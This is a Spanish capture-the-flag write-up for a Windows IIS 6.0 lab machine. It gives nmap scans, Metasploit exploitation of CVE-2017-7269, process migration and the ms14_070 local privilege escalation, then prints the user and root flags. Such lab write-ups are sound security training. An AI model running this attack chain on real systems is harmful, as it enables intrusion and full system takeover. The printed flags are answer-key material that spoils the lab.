
![[ 20250720112518.png]](grandpa-images/20250720112518.png)

# NMAP

Lo primero es hacer un escaneo básico de puertos con nmap 

>En los writeups de aqui en adelante cambiare la ejecución de algunos comandos por ejemplo :
> - en Nmap cambiaremos -oN scanner (que es la manera en la que solía realizar el primer escaneo ) por -oG allPorts (ahora lo haremos en formato grepeable mandándolo al archivo allPorts se le puede poner cualquier nombre pero yo me he guiado de como hace mas maquina S4vitar y ya por la costumbre de verlo asi voy a mantener el mismo nombre )

```bash
nmap -p- --open --min-rate 5000 -vvv -n -Pn 10.129.182.216 -oG allPorts
```

![[ 20250720112643.png]](grandpa-images/20250720112643.png)

>haremos este formato grepeable por el motivo de que tenemos en el .zshrc una funcion llamada extractPorts (tambien de S4vitar) con la que veremos de manera sencilla los puertos, a demas que se quedaran guardados en la clipboard y sera mas sencillo el siguiente escaner con scripts>

```bash
extractPorts allPorts
```

![[ 20250720113211.png]](grandpa-images/20250720113211.png)

>En este caso solo es un puerto pero cuando se tratan de 5, 6 u 10 puertos abiertos esta función nos ayuda bastante a dinamizar el proceso de reconocimiento

seguimos con un escaneo con scripts básicos de nmap 

```bash
nmap -p80 -sCV 10.129.222.98 -oN targeted
```

![[ 20250720113440.png]](grandpa-images/20250720113440.png)

aqui vemos la versión Microsoft IIS httpd 6.0

he explorado el puerto 80 hay bastantes html pero no hay gran cosa que poder hacer con mi nivel actual asi que de momento nos apoyamos en metasploit

# Mestasploit

Buscamos en google con el nombre del servicio y la version 

![[ 20250720113746.png]](grandpa-images/20250720113746.png)

aqui podemos ver que la propia ia de Google reconoce la vulnerabilidad CVE-2017-7269


abrimos metasploit

```bash
msfdb run
```

y  buscamos por la vulnerabilidad encontrada

```bash
search CVE-2017-7269
```

![[ 20250720113945.png]](grandpa-images/20250720113945.png)

como solo hay un modulo utilizaremos ese

```bash
use 0
```

cambiaremos:

- RHOSTS - IP VCTIMA
- LHOST - NUESTRA IP
- (OPCIONAL) LPORT - PUERTO A ELEGIR DE NUESTO SISTEMA 
	-hay veces que los sistemas bloquean el puerto 4444 que es el que usa metasploit por defecto por lo que a veces es mejor cambiarlo


lanzamos el exploit 

```bash
exploit
```

conseguiremos una terminal como meterpreter pero non tendremos acceso a nada así que tenemos que solucionar eso 

# Escalada de privilegios

Aqui descubrí una herramienta que me ha gustado mucho, se usa desde meterpreter por lo que se de momento

```bash
run post/multi/recon/local_exploit_suggester 
```

esta herramienta viene ya instalada y nos hace un escáner de vulnerabilidades en la maquina local en este caso el Windows victima

![[ 20250720112429.png]](grandpa-images/20250720112429.png)


nos da opciones a varios exploits pero seguimos estando en una configuración del sistema que nos limita asi que tendremos que migrar

## migración

usaremos `ps` para ver PID´s a los que podamos migrar y que tengan autorizaciones

```bash
ps
```

![[ 20250720115330.png]](grandpa-images/20250720115330.png)

en este caso migraremos a wmiprvse.exe 

```bash
migrate 1884
```

![[ 20250720115417.png]](grandpa-images/20250720115417.png)

una vez hemos migrado haremos un background del meterpreter para dejar la sesion suspendida y poder reutilizarla


```bash
background
```

ahora utilizaremos uno de los exploits encontrados en el escáner local que hicimos antes. en este caso yo usare `exploit/windows/local/ms14_070_tcpip_ioctl`

![[ 20250720115610.png]](grandpa-images/20250720115610.png)

modificamos:
- SESSION - set session 1
- LHOST - NUESTRA IP
- (OPCIONAL) LPORT - PUERTO A ELEGIR DE NUESTO SISTEMA

y lanzamos el ataque

```bash
exploit
```

ahora si que tendremos una shell de meterpreter con total acceso a todo el sistema

# flags

## User

![[ 20250720120049.png]](grandpa-images/20250720120049.png)

la flag de user esta en el directorio: C:\Documents and Settings\Harry\Desktop

user : bdff5ec67c3cff017f2bedc146a5d869

## Root

![[ 20250720120210.png]](grandpa-images/20250720120210.png)

la flag de root esta en el directorio:  C:\Documents and Settings\Administrator\Desktop

root: 9359e905a2c35f861f6a57cecf28bb7b

# Nota

>Muestro las flags con la intencion de no ocultar nada en el writeup y que todo quede limpio y claro. No obstante de nada sirve copiar la flag para compartir la maquina resuelta, lo que verdaderamente da valor no es la flag si no el entendimiento del proceso para conseguirla.
>Con este writeup lo que se busca es que una persona pueda entender la maquina y las vulnerabilidades que contiene, a demas de aprender la manera de explotarlas. Os animo a que trateis de aprender el proceso y la metodologia y que practiqueis varias veces la maquina hasta poder hacerla sin mirar guias de esta forma este writeup sera realmente eficiente y podreis aprender y crecer en el mundo de la ciberseguiridad al igual que yo trato de aprender y crecer de igual modo.

Esto es todo espero que os ayuden mis writeups.
